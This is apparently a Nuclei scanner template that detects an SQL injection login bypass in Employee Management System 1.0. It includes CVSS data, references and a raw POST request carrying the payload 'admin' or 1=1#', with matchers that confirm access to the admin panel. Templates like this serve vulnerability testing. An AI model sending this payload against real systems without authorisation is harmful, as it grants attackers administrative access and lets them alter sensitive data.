id: ems-sqli
info:
  name: Employee Management System 1.0 - SQL Injection
  author: arafatansari
  severity: critical
  description: The Employee Management System 1.0 has a SQL injection vulnerability
    that can allow attackers to access and modify sensitive database information and
    perform unauthorized administrative actions.
  reference:
  - https://www.exploit-db.com/exploits/48882
  - https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The impact of the SQL injection vulnerability in Employee Management System
      1.0 is the potential for an attacker to access sensitive information, alter
      data, and execute unauthorized administrative operations on the affected site.
    recommendation: It is recommended to patch or update Employee Management System
      1.0 to address the SQL injection vulnerability and prevent unauthorized access
      to sensitive information or administrative operations.
  tags: ems,sqli,cms,auth-bypass,edb
requests:
- raw:
  - 'POST /process/aprocess.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    mailuid=admin'' or 1=1#&pwd=nuclei&login-submit=Login

    '
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Admin Panel
    - Log Out
    - Employee Management System
    condition: and
  - type: status
    status:
    - 200
